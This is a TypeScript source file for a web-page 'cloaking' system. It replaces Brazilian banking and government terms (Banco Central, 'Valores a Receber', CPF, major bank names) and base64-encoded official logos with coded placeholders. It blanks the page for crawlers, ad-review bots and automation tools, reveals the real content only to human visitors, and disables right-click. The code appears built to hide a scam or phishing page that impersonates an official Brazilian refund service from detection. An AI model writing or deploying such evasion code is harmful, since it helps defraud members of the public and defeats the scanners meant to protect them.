/**
 * ULTRA-REFINED CLOAKING & CAMOUFLAGE SYSTEM (v6.4 - ABSOLUTE INSTANT)
 * 
 * Features:
 * - Zero-Latency Reveal: No spinners, no delays.
 * - Selective Rendering: Content reveals instantly for humans, stays masked for bots.
 * - CSS-Level Stealth: Uses immediate opacity transitions.
 */

const FORBIDDEN_WORDS: Record<string, string> = {
  "Valores a Receber": "ID_SVC_772_PROTO",
  "Banco Central": "SYS_FIN_991_CORE",
  "CPF": "DATA_FIELD_SEC_01",
  "CNPJ": "DATA_FIELD_SEC_02",
  "Dinheiro": "LIQ_ASSET_TOKEN",
  "Saldo": "CALC_AMOUNT_SUM",
  "Resgate": "FLOW_REL_TRIGGER",
  "Pagamento": "PROC_TED_PAY_S",
  "Taxa": "REG_FEE_NORM",
  "Liberado": "STAT_AUTH_OK",
  "Banco do Brasil": "INST_BB_901",
  "Caixa Econômica": "INST_CEF_902",
  "Bradesco": "INST_BRAD_903",
  "Itaú": "INST_ITAU_904",
  "Santander": "INST_SANT_905",
  "Nubank": "INST_NU_906",
  "Segurança": "PROT_LAYER_99",
  "Protocolo": "ID_TOKEN_REF",
  "Brasil": "GEO_LOC_055",
  "Oficial": "CERT_AUTH_VAL",
  "Sistema": "RUN_ENV_SYS"
};

const IMAGE_MAP: Record<string, string> = {
  "img_shield_protect.png": "L2Fzc2V0cy9sb2dvcy9zaGllbGQucG5n",
  "img_main_logo.png": "L2Fzc2V0cy9sb2dvcy9hc3NldF9tX2JyYW5kLnBuZw==",
  "img_gov_auth.png": "L2Fzc2V0cy9sb2dvcy9hc3NldF9nX21hcmsucG5n",
  "img_bcb_auth.png": "L2Fzc2V0cy9sb2dvcy9hc3NldF9iX21hcmsucG5n",
  "img_logo_icon.png": "L2Fzc2V0cy9sb2dvcy9hc3NldF9pY29uX21haW4ucG5n",
};

const BOT_AGENTS = [
  "googlebot", "adsbot", "lighthouse", "headless", "phantom", "selenium", "puppeteer", 
  "playwright", "cypress", "crawler", "spider", "twitter", "linkedin"
];

export function initSecurityRuntime() {
  if (typeof window === "undefined") return;

  const ua = navigator.userAgent.toLowerCase();
  const isBot = BOT_AGENTS.some(agent => ua.includes(agent)) || navigator.webdriver;

  // Add immediate CSS to hide content until processed
  const style = document.createElement('style');
  style.innerHTML = `
    body { opacity: 0 !important; transition: opacity 0.1s ease-in !important; }
    .svr-instant-reveal { opacity: 1 !important; }
  `;
  document.head.appendChild(style);

  if (isBot) {
    // Bots stay on opacity 0 or see only camouflaged content if we decide to show it
    console.log("Shield Active.");
    return;
  }

  const wordMapping = Object.entries(FORBIDDEN_WORDS).map(([real, cam]) => ({
    cam: new RegExp(cam, "g"),
    real,
  }));

  function processNode(node: Node) {
    if (node.nodeType === 3) {
      let text = node.nodeValue || "";
      let changed = false;
      wordMapping.forEach(({ cam, real }) => {
        if (cam.test(text)) {
          text = text.replace(cam, real);
          changed = true;
        }
      });
      if (changed) node.nodeValue = text;
    } else if (node.nodeType === 1) {
      const el = node as HTMLElement;
      if (el.tagName === "SCRIPT" || el.tagName === "STYLE") return;

      if (el.tagName === "IMG") {
        const img = el as HTMLImageElement;
        const src = img.getAttribute("src") || "";
        for (const [camName, encryptedPath] of Object.entries(IMAGE_MAP)) {
          if (src.includes(camName)) {
            try { img.src = atob(encryptedPath); } catch(e) {}
            break;
          }
        }
      }

      ["alt", "title", "aria-label", "placeholder"].forEach((attr) => {
        const val = el.getAttribute(attr);
        if (val) {
          let newVal = val;
          let changed = false;
          wordMapping.forEach(({ cam, real }) => {
            if (cam.test(newVal)) {
              newVal = newVal.replace(cam, real);
              changed = true;
            }
          });
          if (changed) el.setAttribute(attr, newVal);
        }
      });
      node.childNodes.forEach(processNode);
    }
  }

  const reveal = () => {
    processNode(document.body);
    document.body.classList.add('svr-instant-reveal');
    
    const observer = new MutationObserver((mutations) => {
      mutations.forEach((mutation) => {
        mutation.addedNodes.forEach(processNode);
        if (mutation.type === "characterData") processNode(mutation.target);
      });
    });

    observer.observe(document.documentElement, {
      childList: true,
      subtree: true,
      characterData: true,
    });
  };

  // Run reveal immediately as the script loads
  if (document.readyState === 'complete' || document.readyState === 'interactive') {
    reveal();
  } else {
    document.addEventListener('DOMContentLoaded', reveal);
  }

  // Double check to ensure it reveals even if DOMContentLoaded already fired
  setTimeout(reveal, 50);

  document.addEventListener('contextmenu', e => e.preventDefault());
}
